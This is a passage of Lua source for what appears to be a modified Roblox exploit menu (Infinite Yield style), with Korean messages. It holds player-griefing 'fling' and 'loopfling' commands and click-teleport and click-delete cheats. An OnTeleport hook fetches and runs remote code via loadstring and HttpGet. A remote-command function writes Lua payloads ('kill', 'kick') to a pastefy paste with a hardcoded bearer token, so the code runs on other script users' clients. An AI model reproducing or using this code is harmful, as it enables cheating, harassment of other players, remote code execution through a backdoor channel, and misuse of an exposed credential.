		if Holder_3 then
			Holder_3:ClearAllChildren()
			Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)

			for i = 1, #aliases do
				local n7 = i * 25 - 25
				local clone = Example_3:Clone()
				clone.Parent = Holder_3
				clone.Visible = true
				clone.Position = UDim2.new(0, 0, 0, n7 + 5)
				clone.Text.Text = aliases[i].CMD .. " > " .. aliases[i].ALIAS
				table.insert(shade2, clone)
				table.insert(shade2, clone.Text)
				table.insert(text1, clone.Text)
				table.insert(shade3, clone.Text.Delete)
				table.insert(text2, clone.Text.Delete)
				Holder_3.CanvasSize = UDim2.new(0, 0, 0, n7 + 30)

				clone.Text.Delete.MouseButton1Click:Connect(function()
					execCmd("removealias " .. aliases[i].ALIAS)
				end)
			end
		end
	end

	local flag8 = false

	BindTo.MouseButton1Click:Connect(function()
		flag6 = true
		BindTo.Text = "Press something"
	end)

	BindTriggerSelect.MouseButton1Click:Connect(function()
		flag8 = not flag8
		BindTriggerSelect.Text = flag8 and "KeyUp" or "KeyDown"
	end)

	newToggle = false
	Cmdbar_3.Parent.Visible = false

	On_2.MouseButton1Click:Connect(function()
		if newToggle == false then
			newToggle = true
			On_2.BackgroundTransparency = 0
			Cmdbar_3.Parent.Visible = true
			BindTriggerSelect.Visible = false
		else
			newToggle = false
			On_2.BackgroundTransparency = 1
			Cmdbar_3.Parent.Visible = false
			BindTriggerSelect.Visible = true
		end
	end)

	Add_2.MouseButton1Click:Connect(function()
		if flag7 then
			if string.find(Cmdbar_2.Text, "\\\\") or string.find(Cmdbar_3.Text, "\\\\") then
				notify("Keybind Error", "Only use one backslash to keybind multiple commands into one keybind or command")
			else
				if newToggle and Cmdbar_3.Text ~= "" and Cmdbar_2.text ~= "" then
					addbind(Cmdbar_2.Text, keyPressed, false, Cmdbar_3.Text)
				else
					if newToggle or Cmdbar_2.text == "" then
						return
					end
					addbind(Cmdbar_2.Text, keyPressed, flag8)
				end

				refreshbinds()
				updatesaves()

				if keyPressed == "RightClick" or keyPressed == "LeftClick" then
					notify("Keybinds Updated", "Binded " .. keyPressed .. " to " .. Cmdbar_2.Text .. (newToggle and " / " .. Cmdbar_3.Text or ""))
				else
					notify("Keybinds Updated", "Binded " .. keyPressed:sub(14) .. " to " .. Cmdbar_2.Text .. (newToggle and " / " .. Cmdbar_3.Text or ""))
				end
			end
		end
	end)

	Exit_2.MouseButton1Click:Connect(function()
		Cmdbar_2.Text = "Command"
		Cmdbar_3.Text = "Command 2"
		BindTo.Text = "Click to bind"
		flag8 = false
		BindTriggerSelect.Text = "KeyDown"
		flag7 = false
		KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
	end)

	onInputBegan = function(arg, arg2)
		if flag6 then
			if arg.UserInputType == Enum.UserInputType.Keyboard then
				keyPressed = tostring(arg.KeyCode)
				BindTo.Text = keyPressed:sub(14)
			elseif arg.UserInputType == Enum.UserInputType.MouseButton1 then
				keyPressed = "LeftClick"
				BindTo.Text = "LeftClick"
			elseif arg.UserInputType == Enum.UserInputType.MouseButton2 then
				keyPressed = "RightClick"
				BindTo.Text = "RightClick"
			end

			flag6 = false
			flag7 = true
		end

		if not arg2 and #binds > 0 then
			for _, v2 in pairs(binds) do
				if not v2.ISKEYUP then
					local flag9 = arg.UserInputType == Enum.UserInputType.Keyboard

					if flag9 then
						flag9 = v2.KEY:lower() == tostring(arg.KeyCode):lower()
					end

					if flag9 or arg.UserInputType == Enum.UserInputType.MouseButton1 and v2.KEY:lower() == "leftclick" or arg.UserInputType == Enum.UserInputType.MouseButton2 and v2.KEY:lower() == "rightclick" then
						if v2.TOGGLE then
							local flag10 = toggleOn[v2] == true
							toggleOn[v2] = not flag10

							if flag10 then
								execCmd(v2.TOGGLE, Players.LocalPlayer)
							else
								execCmd(v2.COMMAND, Players.LocalPlayer)
							end
						else
							execCmd(v2.COMMAND, Players.LocalPlayer)
						end
					end
				end
			end
		end
	end

	onInputEnded = function(arg, arg2)
		if not arg2 and #binds > 0 then
			for _, v2 in pairs(binds) do
				if v2.ISKEYUP then
					local flag9 = arg.UserInputType == Enum.UserInputType.Keyboard

					if flag9 then
						flag9 = v2.KEY:lower() == tostring(arg.KeyCode):lower()
					end

					local flag10

					if flag9 then
						flag10 = flag9
					else
						flag10 = arg.UserInputType == Enum.UserInputType.MouseButton1 and v2.KEY:lower() == "leftclick"
					end

					local flag11

					if flag10 then
						flag11 = flag10
					else
						flag11 = arg.UserInputType == Enum.UserInputType.MouseButton2 and v2.KEY:lower() == "rightclick"
					end

					if flag11 then
						execCmd(v2.COMMAND, Players.LocalPlayer)
					end
				end
			end
		end
	end

	UserInputService.InputBegan:Connect(onInputBegan)
	UserInputService.InputEnded:Connect(onInputEnded)

	ClickTP.Select.MouseButton1Click:Connect(function()
		if flag7 then
			addbind("clicktp", keyPressed, flag8)
			refreshbinds()
			updatesaves()

			if keyPressed == "RightClick" or keyPressed == "LeftClick" then
				notify("Keybinds Updated", "Binded " .. keyPressed .. " to click tp")
			else
				notify("Keybinds Updated", "Binded " .. keyPressed:sub(14) .. " to click tp")
			end
		end
	end)

	ClickDelete.Select.MouseButton1Click:Connect(function()
		if flag7 then
			addbind("clickdel", keyPressed, flag8)
			refreshbinds()
			updatesaves()

			if keyPressed == "RightClick" or keyPressed == "LeftClick" then
				notify("Keybinds Updated", "Binded " .. keyPressed .. " to click delete")
			else
				notify("Keybinds Updated", "Binded " .. keyPressed:sub(14) .. " to click delete")
			end
		end
	end)

	local function getHwid4()
		pcall(function()
			local character = Players.LocalPlayer.Character
			local humanoid = character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.SeatPart then
				humanoid.Sit = false
				wait(0.1)
			end

			local n7 = humanoid and humanoid.HipHeight > 0 and humanoid.HipHeight + 1
			local v2 = getRoot(character)
			local position = v2.Position
			local position2 = IYMouse.Hit.Position
			v2.CFrame = CFrame.new(position2, Vector3.new(position.X, position2.Y, position.Z)) * CFrame.Angles(0, 3.1415926535897931, 0) + Vector3.new(0, n7 or 4, 0)
		end)
	end

	IYMouse.Button1Down:Connect(function()
		for _, v2 in pairs(binds) do
			if v2.COMMAND == "clicktp" then
				local key = v2.KEY

				if key == "RightClick" and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
					getHwid4()
				elseif key == "LeftClick" and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
					getHwid4()
				elseif UserInputService:IsKeyDown(Enum.KeyCode[key:sub(14)]) and Players.LocalPlayer.Character then
					getHwid4()
				end
			elseif v2.COMMAND == "clickdel" then
				local key = v2.KEY

				if key == "RightClick" and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
					pcall(function()
						IYMouse.Target:Destroy()
					end)
				elseif key == "LeftClick" and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
					pcall(function()
						IYMouse.Target:Destroy()
					end)
				elseif UserInputService:IsKeyDown(Enum.KeyCode[key:sub(14)]) then
					pcall(function()
						IYMouse.Target:Destroy()
					end)
				end
			end
		end
	end)

	PluginsGUI = PluginEditor.background

	getgenv().RegisterPluginCommand = function(arg, arg2, arg3, arg4, arg5, arg6)
		if not arg then
			return
		end
		arg.Commands = arg.Commands or {}

		arg.Commands[arg2] = {
			Aliases = arg3 or {},
			Description = arg4 or "",
			Function = arg5,
			Vape = arg6 == nil and true or arg6,
			ShowVape = arg6 == nil and true or arg6,
		}

		return arg
	end

	addPlugin = function(arg)
		if arg:lower() == "plugin file name" or arg:lower() == "iy_fe.iy" or arg == "iy_fe" then
			notify("Plugin Error", "Please enter a valid plugin")
		else
			local v2 = nil

			if arg:sub(-3) == ".iy" then
				pcall(function()
					v2 = readfile(arg)
				end)
			else
				pcall(function()
					v2 = readfile(arg .. ".iy")
				end)

				arg ..= ".iy"
			end

			if v2 then
				if not FindInTable(PluginsTable, arg) then
					table.insert(PluginsTable, arg)
					LoadPlugin(arg)
					refreshplugins()
					pcall(eventEditor.Refresh)
				else
					notify("Plugin Error", "This plugin is already added")
				end
			else
				notify("Plugin Error", "Cannot locate file \"" .. arg .. "\". Is the file in the correct folder?")
			end
		end
	end

	deletePlugin = function(arg)
		local str2 = arg .. ".iy"

		if arg:sub(-3) ~= ".iy" then
			arg = str2
		end

		for i = #cmds, 1, -1 do
			if cmds[i].PLUGIN == arg then
				table.remove(cmds, i)
			end
		end

		for _, child in pairs(CMDsF:GetChildren()) do
			if child.Name == "PLUGIN_" .. arg then
				child:Destroy()
			end
		end

		for k, v2 in pairs(PluginsTable) do
			if v2 == arg then
				table.remove(PluginsTable, k)
				notify("Removed Plugin", arg .. " was removed")
			end
		end

		IndexContents("", true)
		refreshplugins()
	end

	refreshplugins = function(arg)
		if #PluginsTable > 0 then
			PluginsHint:Destroy()
		end

		if Holder_5 then
			Holder_5:ClearAllChildren()
			Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)

			for k, v2 in pairs(PluginsTable) do
				local v3 = v2
				local n7 = k * 25 - 25
				local clone = Example_5:Clone()
				clone.Parent = Holder_5
				clone.Visible = true
				clone.Position = UDim2.new(0, 0, 0, n7 + 5)
				clone.Text.Text = v3
				table.insert(shade2, clone)
				table.insert(shade2, clone.Text)
				table.insert(text1, clone.Text)
				table.insert(shade3, clone.Text.Delete)
				table.insert(text2, clone.Text.Delete)
				Holder_5.CanvasSize = UDim2.new(0, 0, 0, n7 + 30)

				clone.Text.Delete.MouseButton1Click:Connect(function()
					deletePlugin(v3)
				end)
			end

			if not arg then
				updatesaves()
			end
		end
	end

	LoadPlugin = function(arg, arg2)
		local v2 = nil

		CatchedPluginLoad = function()
			local v3 = nil

			pcall(function()
				if isfile then
					if isfile(arg) then
						v3 = readfile(arg)
					elseif isfile(arg .. ".iy") then
						v3 = readfile(arg .. ".iy")
					end
				end
			end)

			if not v3 then
				pcall(function()
					v3 = readfile(arg)
				end)

				if not v3 then
					pcall(function()
						v3 = readfile(arg .. ".iy")
					end)
				end
			end

			if v3 and v3 ~= "" then
				local chunk, chunk2 = loadstring(v3)

				if chunk then
					v2 = chunk()
				else
					error("Plugin loadstring syntax error in '" .. tostring(arg) .. "': " .. tostring(chunk2))
				end
			elseif loadfile then
				v2 = loadfile(arg)()
			else
				error("Plugin file not found or unreadable: " .. tostring(arg))
			end
		end

		handlePluginError = function(arg3)
			notify("Plugin Error", "An error occurred with the plugin, \"" .. arg .. "\" and it could not be loaded")

			if FindInTable(PluginsTable, arg) then
				for k, v3 in pairs(PluginsTable) do
					if v3 == arg then
						table.remove(PluginsTable, k)
					end
				end
			end

			updatesaves()
			print("Original Error: " .. tostring(arg3))
			print("Plugin Error, stack traceback: " .. tostring(debug.traceback()))
			v2 = nil
			return false
		end

		xpcall(CatchedPluginLoad, handlePluginError)

		if v2 ~= nil then
			if not arg2 then
				notify("Loaded Plugin", "Name: " .. v2.PluginName .. "\n" .. "Description: " .. v2.PluginDescription)
			end

			addcmdtext("", arg)
			local pluginDescription = v2.PluginDescription
			addcmdtext(string.upper("--" .. v2.PluginName), arg, pluginDescription)

			if v2.Commands then
				for k, command in pairs(v2.Commands) do
					local str2 = ""
					local v3 = k
					local fn3 = nil

					fn3 = function()
						v3 = k

						if findCmd(v3 .. str2) then
							if isNumber(str2) then
								str2 += 1
							else
								str2 = 1
							end

							fn3()
						else
							v3 ..= str2
						end
					end

					fn3()
					local function_ = command.Function
					local vape = command.Vape

					if vape == nil then
						vape = command.ShowVape
					end

					if vape == nil then
						vape = command.VapeCard
					end

					addcmd(v3, command.Aliases, function(arg3, arg4)
						if vape == true then
							if getgenv().addvape then
								getgenv().addvape(v3)
							end
						elseif vape == false then
							if getgenv().delvape then
								getgenv().delvape(v3)
							end
						end

						if function_ then
							function_(arg3, arg4)
						end
					end, arg)

					if command.ListName then
						local listName = command.ListName

						for _, v4 in pairs({ k, unpack(command.Aliases) }) do
							listName = listName:gsub(v4, v4 .. str2)
						end

						addcmdtext(listName, arg, command.Description)
					else
						addcmdtext(v3, arg, command.Description)
					end
				end
			end

			IndexContents("", true)
		elseif v2 == nil then
			v2 = nil
		end
	end

	FindPlugins = function()
		if PluginsTable ~= nil and type(PluginsTable) == "table" then
			for _, v2 in pairs(PluginsTable) do
				LoadPlugin(v2, true)
			end

			refreshplugins(true)
		end
	end

	AddPlugin.MouseButton1Click:Connect(function()
		addPlugin(PluginsGUI.FileName.Text)
	end)

	Exit_3.MouseButton1Click:Connect(function()
		PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
		FileName.Text = "Plugin File Name"
	end)

	Add_3.MouseButton1Click:Connect(function()
		PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, 310), "InOut", "Quart", 0.5, true, nil)
	end)

	Plugins.MouseButton1Click:Connect(function()
		if writefileExploit() then
			if getgenv().addvape then
				getgenv().addvape("Plugins")
			end

			PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
		else
			notify("Incompatible Exploit", "Your exploit is unable to use plugins (missing read/writefile)")
		end
	end)

	Close_4.MouseButton1Click:Connect(function()
		if getgenv().delvape then
			getgenv().delvape("Plugins")
		end

		SettingsHolder.Visible = true
		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	addcmd("plugins", { "plugin", "manageplugins" }, function(arg)
		if arg[1] then
			local str2 = arg[1]:lower()

			if str2 == "add" or str2 == "load" then
				local v2 = arg[2]

				if v2 and v2 ~= "" then
					addPlugin(v2)
				else
					notify("Plugin Error", "명령어 예시: ;plugins add <파일명>", 3)
				end

				return
			end

			if str2 == "delete" or str2 == "del" or str2 == "remove" then
				local v2 = arg[2]

				if v2 and v2 ~= "" then
					deletePlugin(v2)
				else
					notify("Plugin Error", "명령어 예시: ;plugins del <파일명>", 3)
				end

				return
			end
		end

		if getgenv().addvape then
			getgenv().addvape("Plugins")
		end

		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Players.LocalPlayer.OnTeleport:Connect(function(arg)
		if arg == Enum.TeleportState.Started then
			if KeepInfYield and queueteleport then
				queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
			end
		end
	end)

	local function fn3(arg)
		if not arg then
			return false
		end
		local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			return false
		end
		local raycastParams = RaycastParams.new()
		raycastParams.FilterDescendantsInstances = { arg, Players.LocalPlayer.Character }
		raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
		local hit = game:GetService("Workspace"):Raycast(humanoidRootPart.Position, Vector3.new(0, -500, 0), raycastParams)

		if hit then
			if (humanoidRootPart.Position - hit.Position).Magnitude > 30 then
				return true
			end
			return false
		end

		return true
	end

	local cframe = CFrame.new(0, 0, 0)

	addcmd("fling", { "fkill" }, function(arg)
		if not arg[1] then
			notify("Fling", "Target을 입력해주세요")
			return
		end
		local str2 = arg[1]:lower()
		local v2 = nil

		for _, player in pairs(Players:GetPlayers()) do
			if player.Name:lower() == str2 or player.DisplayName:lower() == str2 then
				v2 = player
				break
			end
		end

		if not v2 then
			for _, player in pairs(Players:GetPlayers()) do
				if player.Name:lower():find(str2, 1, true) or player.DisplayName:lower():find(str2, 1, true) then
					v2 = player
					break
				end
			end
		end

		if not v2 then
			notify("Fling", "Target을 찾을 수 없습니다")
			return
		end
		local localPlayer = Players.LocalPlayer

		if v2 and v2.Character and localPlayer.Character then
			local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
			local humanoidRootPart2 = v2.Character:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart or not humanoidRootPart2 then
				notify("Fling", "HumanoidRootPart을 찾을 수 없습니다")
				return
			end

			if fn3(v2.Character) then
				notify("Fling", "타겟이 바닥에서 30 이상 떨어져 있어 스킵합니다.")
				return
			end
			local cFrame2 = humanoidRootPart.CFrame
			local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
			settings().Physics.AllowSleep = false

			pcall(function()
				sethidden(localPlayer, "SimulationRadius", math.huge)
				sethidden(localPlayer, "MaxSimulationRadius", math.huge)
			end)

			local connection4 = nil
			local flag9 = false

			connection4 = game:GetService("RunService").Heartbeat:Connect(function()
				if not v2.Character or not v2.Character:FindFirstChild("HumanoidRootPart") or flag9 then
					connection4:Disconnect()
					return
				end

				if fn3(v2.Character) then
					flag9 = true

					if connection4 then
						connection4:Disconnect()
					end

					return
				end

				if humanoid then
					humanoid.PlatformStand = true
				end

				for _, descendant in pairs(localPlayer.Character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
						descendant.CanTouch = false
						descendant.CanQuery = false
						descendant.Velocity = Vector3.new(math.huge, math.huge, math.huge)
						descendant.RotVelocity = Vector3.new(math.huge, math.huge, math.huge)
					end
				end

				pcall(function()
					setPhysicsRep(humanoidRootPart, humanoidRootPart2)
				end)

				humanoidRootPart.Velocity = Vector3.new(math.huge, math.huge, math.huge)
				humanoidRootPart.RotVelocity = Vector3.new(math.huge, math.huge, math.huge)
				local rad = math.rad
				local random = math.random
				humanoidRootPart.CFrame = humanoidRootPart2.CFrame * CFrame.Angles(math.rad(math.random(0, 360)), math.rad(math.random(0, 360)), rad(random(0, 360))) * CFrame.new(0, 0, 0.05) * cframe
			end)

			notify("Fling", v2.Name .. "에게 초강력 Fling!")
			local now = tick()

			while true do
				task.wait()
				if not flag9 and tick() - now <= 3 then
					continue
				end
				break
			end

			if connection4 then
				connection4:Disconnect()
			end

			if humanoid then
				humanoid.PlatformStand = false
			end

			if humanoidRootPart and humanoidRootPart.Parent then
				humanoidRootPart.CFrame = cFrame2
				humanoidRootPart.Velocity = Vector3.zero
				humanoidRootPart.RotVelocity = Vector3.zero
			end

			notify("Fling", "작업 완료 및 복귀!")
		else
			notify("Fling", "Target을 찾을 수 없습니다")
		end
	end)

	getgenv().LoopFlingActive = false
	getgenv().LoopFlingTargets = {}

	addcmd("loopfling", {}, function(arg)
		if not arg[1] then
			notify("LoopFling", "최소 1명 이상의 Target을 입력해주세요")
			return
		end

		local function fn4(arg2)
			local str2 = arg2:lower()

			for _, player in pairs(Players:GetPlayers()) do
				if player.Name:lower() == str2 or player.DisplayName:lower() == str2 then
					return player
				end
			end

			for _, player in pairs(Players:GetPlayers()) do
				if player.Name:lower():find(str2, 1, true) or player.DisplayName:lower():find(str2, 1, true) then
					return player
				end
			end

			return nil
		end

		local tbl6 = {}

		for i = 1, #arg do
			local v2 = fn4(arg[i])

			if v2 then
				local flag9 = false

				for _, v3 in pairs(tbl6) do
					if v3 == v2 then
						flag9 = true
						break
					end
				end

				if not flag9 then
					table.insert(tbl6, v2)
				end
			end
		end

		if #tbl6 == 0 then
			notify("LoopFling", "Target을 찾을 수 없습니다")
			return
		end
		local v2, v3, v4 = pairs(tbl6)
		local str2 = ""

		for k, v5 in v2, v3, v4 do
			if k == 1 then
				str2 = v5.Name
			else
				str2 ..= ", " .. v5.Name
			end

			if getgenv().addTargetCmd then
				getgenv().addTargetCmd(v5, "loopfling")
			end
		end

		notify("LoopFling", str2 .. " LoopFling 시작!")
		getgenv().LoopFlingActive = true
		local localPlayer = Players.LocalPlayer
		local n7 = 1

		task.spawn(function()
			settings().Physics.AllowSleep = false

			pcall(function()
				sethidden(localPlayer, "SimulationRadius", math.huge)
				sethidden(localPlayer, "MaxSimulationRadius", math.huge)
			end)

			while getgenv().LoopFlingActive do
				local v5 = tbl6[n7]

				if v5 and v5.Character and v5.Parent == Players then
					local character = localPlayer.Character

					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						local humanoidRootPart2 = v5.Character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart and humanoidRootPart2 then
							if not fn3(v5.Character) then
								local cFrame2 = humanoidRootPart.CFrame
								local connection4 = nil
								local flag9 = false

								connection4 = game:GetService("RunService").Heartbeat:Connect(function()
									if not getgenv().LoopFlingActive or not v5 or not v5.Character or flag9 then
										if connection4 then
											connection4:Disconnect()
										end

										return
									end

									local character2 = localPlayer.Character

									if not character2 then
										if connection4 then
											connection4:Disconnect()
										end

										return
									end

									local humanoidRootPart3 = character2:FindFirstChild("HumanoidRootPart")
									local humanoidRootPart4 = v5.Character:FindFirstChild("HumanoidRootPart")
									local humanoid = character2:FindFirstChildOfClass("Humanoid")

									if not humanoidRootPart3 or not humanoidRootPart4 then
										if connection4 then
											connection4:Disconnect()
										end

										return
									end

									if fn3(v5.Character) then
										flag9 = true

										if connection4 then
											connection4:Disconnect()
										end

										return
									end

									if humanoid then
										humanoid.PlatformStand = true
									end

									for _, descendant in pairs(character2:GetDescendants()) do
										if descendant:IsA("BasePart") then
											descendant.CanCollide = false
											descendant.CanTouch = false
											descendant.CanQuery = false
											descendant.Velocity = Vector3.new(math.huge, math.huge, math.huge)
											descendant.RotVelocity = Vector3.new(math.huge, math.huge, math.huge)
										end
									end

									pcall(function()
										setPhysicsRep(humanoidRootPart3, humanoidRootPart4)
									end)

									humanoidRootPart3.Velocity = Vector3.new(math.huge, math.huge, math.huge)
									humanoidRootPart3.RotVelocity = Vector3.new(math.huge, math.huge, math.huge)
									local rad = math.rad
									local random = math.random
									humanoidRootPart3.CFrame = humanoidRootPart4.CFrame * CFrame.Angles(math.rad(math.random(0, 360)), math.rad(math.random(0, 360)), rad(random(0, 360))) * CFrame.new(0, 0, 0.05) * cframe
								end)

								local now = tick()

								while true do
									task.wait()
									if not flag9 and tick() - now <= 3 and getgenv().LoopFlingActive then
										continue
									end
									break
								end

								if connection4 then
									connection4:Disconnect()
								end

								if localPlayer.Character then
									local humanoidRootPart3 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
									local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")

									if humanoid then
										humanoid.PlatformStand = false
									end

									if humanoidRootPart3 then
										humanoidRootPart3.CFrame = cFrame2
										humanoidRootPart3.Velocity = Vector3.zero
										humanoidRootPart3.RotVelocity = Vector3.zero
									end
								end

								task.wait(0.2)
							end
						end
					end
				end

				n7 += 1

				if #tbl6 < n7 then
					n7 = 1
				end

				task.wait(0.1)
			end
		end)
	end)

	addcmd("unloopfling", {}, function(arg)
		getgenv().LoopFlingActive = false
		getgenv().LoopFlingTargets = {}

		if getgenv().removeTargetCmd then
			if arg[1] then
				local v2 = arg[1]
				getgenv().removeTargetCmd(v2, "loopfling")
			else
				getgenv().removeTargetCmd(nil, "loopfling")
			end
		end

		notify("LoopFling", "LoopFling 중지됨")
	end)

	addcmd("phantasmbreakergui", { "phbgui" }, function()
		local localPlayer = game.Players.LocalPlayer
		;(localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("Humanoid")
		local tbl6 = { "12342141464", "18435535291", "15391323441" }
		local flag9 = false
		local v2 = nil
		local screenGui2 = Instance.new("ScreenGui", localPlayer.PlayerGui)
		screenGui2.ResetOnSpawn = false
		local frame2 = Instance.new("Frame", screenGui2)
		frame2.Size = UDim2.new(0, 150, 0, 80)
		frame2.Position = UDim2.new(0.5, -75, 0.8, 0)
		frame2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
		frame2.BorderSizePixel = 1
		frame2.Active = true
		frame2.Draggable = true
		local textButton2 = Instance.new("TextButton", frame2)
		textButton2.Size = UDim2.new(0, 20, 0, 20)
		textButton2.Position = UDim2.new(1, -20, 0, 0)
		textButton2.Text = "X"
		textButton2.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
		textButton2.TextColor3 = Color3.new(1, 1, 1)

		textButton2.MouseButton1Click:Connect(function()
			flag9 = false

			if v2 then
				pcall(function()
					v2:Stop()
				end)
			end

			screenGui2:Destroy()
			getgenv().delvape("phantasmbreakergui")
		end)

		local textButton3 = Instance.new("TextButton", frame2)
		textButton3.Size = UDim2.new(0.9, 0, 0, 40)
		textButton3.Position = UDim2.new(0.05, 0, 0, 25)
		textButton3.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
		textButton3.Text = "판타즘세미갓 브래이커"
		textButton3.TextColor3 = Color3.new(1, 1, 1)
		textButton3.Font = Enum.Font.GothamBold
		textButton3.TextSize = 12

		local function fn4()
			while flag9 do
				for _, v3 in ipairs(tbl6) do
					if flag9 then
						local humanoid = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):FindFirstChildWhichIsA("Humanoid")

						if humanoid then
							local animation = Instance.new("Animation")
							animation.AnimationId = "rbxassetid://" .. v3
							v2 = humanoid:LoadAnimation(animation)

							pcall(function()
								v2.Priority = Enum.AnimationPriority.Action4
							end)

							pcall(function()
								if v2.Priority ~= Enum.AnimationPriority.Action4 then
									v2.Priority = Enum.AnimationPriority.Action
								end
							end)

							v2:Play(0.05, 1, 1)
							v2:AdjustSpeed(7)

							local connection4 = v2.Stopped:Connect(function()
								if flag9 and v2 and v2.TimePosition < v2.Length * 0.8 then
									pcall(function()
										v2:Play(0.05, 1, 1)
										v2:AdjustSpeed(7)
									end)
								end
							end)

							task.wait(0.05)

							while v2 and v2.IsPlaying and flag9 do
								task.wait(0.05)
							end

							if connection4 then
								connection4:Disconnect()
							end

							pcall(function()
								v2:Destroy()
							end)

							continue
						end
					end

					break
				end

				task.wait()
			end
		end

		textButton3.MouseButton1Click:Connect(function()
			flag9 = not flag9

			if flag9 then
				textButton3.Text = "실행중.."
				textButton3.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
				task.spawn(fn4)
			else
				textButton3.Text = "판타즘세미갓 브래이커(off)"
				textButton3.BackgroundColor3 = Color3.fromRGB(30, 30, 35)

				if v2 then
					pcall(function()
						v2:Stop()
					end)
				end
			end
		end)

		notify("Phantasm Breaker", "GUI가 생성되었습니다!")
	end)

	addcmd("test", {}, function()
		print("aaa")
		wait(1)
		getgenv().delvape("test")
		notify("완료", "aaa 출력이 완료되었습니다", 3)
	end)

	safeGet = function(tbl6, key)
		local localPlayer = tbl6 and Players.LocalPlayer

		if localPlayer then
			localPlayer = string.lower(tbl6) == string.lower(Players.LocalPlayer.Name)

			if not localPlayer then
				localPlayer = string.lower(tbl6) == string.lower(Players.LocalPlayer.DisplayName or "")
			end
		end

		if localPlayer then
			notify("Error", "자기 자신은 타겟으로 지정할 수 없습니다", 3)
			return false
		end
		local _httprequest = httprequest or syn and syn.request
		local request_

		if _httprequest then
			request_ = _httprequest
		else
			request_ = http and http.request
		end

		local _http_request = request_ or http_request or fluxus and fluxus.request or request
		if not _http_request then
			notify("Error", "HTTP Request를 지원하지 않는 실행기입니다", 3)
			return false
		end
		local str2 = "VNW4VFUeWAgZNLCphil4pc6uAKVcmZmtOi6yziEPuR5FmEjJwndwIcezg0kZ"
		local str3 = tbl6 .. "|" .. key

		return (pcall(function()
			_http_request({
				Url = "https://pastefy.app/api/v2/paste/TlJLq0iV",
				Method = "PUT",
				Headers = {
					Authorization = "Bearer " .. str2,
					["Content-Type"] = "application/json",
					["Cache-Control"] = "no-cache, no-store, must-revalidate",
					Pragma = "no-cache",
				},
				Body = game:GetService("HttpService"):JSONEncode({ title = "cmd", content = str3 }),
			})
		end))
	end

	getgenv().sendRemoteCommand = safeGet

	addcmd("kill", {}, function(arg)
		getgenv().delvape("kill")
		if not arg[1] then
			notify("Error", "대상을 지정해주세요", 3)
			return
		end
		local v2 = arg[1]
		local v3 = nil

		for _, player in pairs(Players:GetPlayers()) do
			if string.lower(player.Name):find(string.lower(v2), 1, true) or string.lower(player.DisplayName):find(string.lower(v2), 1, true) then
				v3 = player
				break
			end
		end

		if not v3 then
			notify("Error", "플레이어를 찾을 수 없습니다: " .. v2, 3)
			return
		end

		if v3 == Players.LocalPlayer then
			notify("Error", "자기 자신은 타겟으로 지정할 수 없습니다", 3)
			return
		end
		local activeScriptUsersMap = getgenv().activeScriptUsersMap or {}
		local flag9 = false

		for k in pairs(activeScriptUsersMap) do
			if k == string.lower(v3.Name) then
				flag9 = true
				break
			end
		end

		if not flag9 then
			notify("Error", v3.Name .. "님은 스크립트 사용자가 아닙니다", 3)
			return
		end

		task.spawn(function()
			if safeGet(v3.Name, "game.Players.LocalPlayer.Character.Humanoid.Health = 0") then
				notify("Kill", v3.Name .. "님에게 처치 명령을 전송했습니다", 3)
			else
				notify("Error", "명령 전송에 실패했습니다", 3)
			end
		end)
	end)

	addcmd("kick", {}, function(arg)
		getgenv().delvape("kick")
		if not arg[1] then
			notify("Error", "대상을 지정해주세요", 3)
			return
		end
		local v2 = arg[1]
		local str2 = table.concat(arg, " ", 2)

		if str2 == "" then
			str2 = "강제 퇴장 처리되었습니다."
		end

		local v3 = nil

		for _, player in pairs(Players:GetPlayers()) do
			if string.lower(player.Name):find(string.lower(v2), 1, true) or string.lower(player.DisplayName):find(string.lower(v2), 1, true) then
				v3 = player
				break
			end
		end

		if not v3 then
			notify("Error", "플레이어를 찾을 수 없습니다: " .. v2, 3)
			return
		end

		if v3 == Players.LocalPlayer then
			notify("Error", "자기 자신은 타겟으로 지정할 수 없습니다", 3)
			return
		end
		local activeScriptUsersMap = getgenv().activeScriptUsersMap or {}
		local flag9 = false

		for k in pairs(activeScriptUsersMap) do
			if k == string.lower(v3.Name) then
				flag9 = true
				break
			end
		end

		if not flag9 then
			notify("Error", v3.Name .. "님은 스크립트 사용자가 아닙니다", 3)
			return
		end

		task.spawn(function()
			if safeGet(v3.Name, "game.Players.LocalPlayer:Kick(\"" .. str2 .. "\")") then
